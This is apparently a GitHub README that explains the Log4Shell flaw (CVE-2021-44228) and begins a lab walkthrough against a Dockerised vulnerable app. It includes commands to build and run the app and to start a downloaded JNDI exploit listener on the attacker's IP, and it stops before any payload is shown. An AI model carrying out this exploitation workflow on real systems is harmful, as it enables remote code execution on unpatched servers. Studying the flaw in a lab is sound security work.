# log4shell_exec-example
![images](https://user-images.githubusercontent.com/45577616/145818227-12f2a0fc-4064-49ed-8389-d9c64a8ec089.jpg)

## introduction

CVE-2021-44228
This vulnerability has caused a stir in the global cyber community, since the Wannacry we have not seen such an impact.

### the reason:
Most apps written in Java are thought to be affected and vulnerable, particularly Apache frameworks including Apache Struts2, Apache Solr, Apache Druid, and Apache Flink.  In addition, ElasticSearch, Flume, Logstash, Kafka, Netty, MyBatis, and Spring-Boot-starter-log4j are also vulnerable.
Some of the most popular products and services on the internet - including Apple iCloud, Amazon, Steam and Twitter - rely on these frameworks to function. This is also thought to include a significant number of enterprise and cyber security applications too.

Radware (Continuously adaptive real-time DDoS services )said only software enabling and utilising log4j message lookup substitution is affected. From version 2.15.0, message lookup substitution is disabled by default which is why patching is necessary. Log4j 2 versions 2.0-beta9 to 2.14.1 are all vulnerable and exploitable.

## recommendation

before we going to drill down to the exploitation log4shell , let's check and to patch affected instances up to the latest available version which is log4j 2 2.15.0.

## exploitation execution - step by step:

### Video Guide usefull



* 1 for first we are going to work with kali linux vm and run the java listener in the next command, in the left side in the video guide.
we need to build docker vulnerability-application and then run it. 
so let's to do this.

run the command ``` docker build . -t vulnerable-app```

* 2 the next step, actually to run the vulnerable-app what our created before. 
* 
so, the next command: ``` docker run -p 8080:8080 --name vulnerable-app vulnerable-app ```

and now you will see the spring script running like at video guide. 

* 3 for now to get the fingureprint to ldap server we're just need to create the ldap link and we done, but before we're don't forget the exploit tool_JNdIExploit-1.2, 
download that from my repository, is called J_N_D_I__EXP.ZIP.

so, let's do this

run the java listener: ``` java -jar J_N_D_I__EXP.ZIP-SNAPSHOT.jar -i "replace_with_ypure_IP-ADDR" -p 8888```

note: Delete "replace_with your IP-addr" and enter your IP listener.
(Including brackets).
![log4shell-critical-vulnerability-in-apache-log4j-featured](https://user-images.githubusercontent.com/45577616/145818313-3b78f77c-fd12-4f12-aa0d-fff3ac4ed1ac.jpg)

